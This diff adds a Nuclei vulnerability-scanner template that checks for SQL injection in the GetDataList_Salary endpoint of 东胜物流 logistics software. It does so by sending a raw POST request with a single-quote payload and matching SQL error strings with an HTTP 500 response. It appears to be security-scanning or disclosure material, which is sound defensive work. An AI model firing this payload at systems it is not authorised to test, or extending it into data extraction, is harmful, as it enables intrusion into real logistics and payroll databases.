@@ -1,0 +1,37 @@
+id: dongshengwuliu-getdatalist-salary-sqli
+
+info:
+  name: 东胜物流 GetDataList_Salary SQL注入
+  author: bl
+  severity: high
+  description: |
+    东胜物流 /TruckMng/MsWlDriver/GetDataList_Salary 接口存在SQL注入漏洞
+  reference:
+    - hw2025
+  classification:
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+  tags: 东胜物流软件
+
+http:
+  - raw:
+      - |
+        POST /TruckMng/MsWlDriver/GetDataList_Salary?_dc=1665626804091&start=0&limit=30&sort=&condition=1*&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Length: 456
+        
+        strCwSTARTGID=1'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '附近有语法错误'
+          - 'SqlException'
+        condition: and
+      - type: status
+        status:
+          - 500
